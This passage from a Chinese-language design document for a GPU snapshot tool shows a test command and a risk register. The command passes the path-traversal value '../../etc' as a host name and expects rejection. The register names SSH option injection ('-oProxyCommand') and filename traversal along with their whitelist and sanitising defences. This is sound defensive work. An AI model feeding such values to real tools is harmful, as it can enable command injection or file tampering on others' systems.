python src/gpu_snapshot.py --mock --host "../../etc" --out-dir ./out/snap; echo "exit=$?"   # 3（host 白名单直接挡掉）
```

---

## 8. 未做 / 风险登记（与 02·K1~K7 对齐）

| # | 事项 | 处置 |
|---|---|---|
| U1 | 历史趋势 / 多主机并发采集 / 跳板机 | Out of Scope（02·Q3、K 表）；`--host "a,b"` 直接 exit 3 + ProxyJump 指引 |
| U2 | 告警去抖、滞回、通知渠道 | 不做（§4.3）；外层循环 + `jq` 判定，README 给标准写法 |
| U3 | 真实远程端到端未验证 | 本沙箱无远程主机；A-A10 记"有条件通过"，靠 fixtures + `parse_smi_csv` 直调兜底 |
| K2 | 驱动字段漂移（`power.limit` / `temperature.gpu` 虚拟化下常缺） | §3.4 的 L1/L2 阶梯 + 两份 fixture（真实 2 卡样本 / 缺字段样本） |
| K4 | host 注入（`-oProxyCommand`） | §2.4 白名单 + 拒 `-` 开头 + `--`；单测必抛 |
| K7 | 文件名穿越 | `safe_host = re.sub(r"[^A-Za-z0-9._-]", "_", host)`；`--host` 白名单已先挡一层，`safe_host` 是第二层 |
| — | `--need-gb` 依赖 `vram_est` 的 ±30% 误差 | §5.5 已声明：分配建议只回答"哪张卡更空"，可行性以 `vram_est` 为准 |
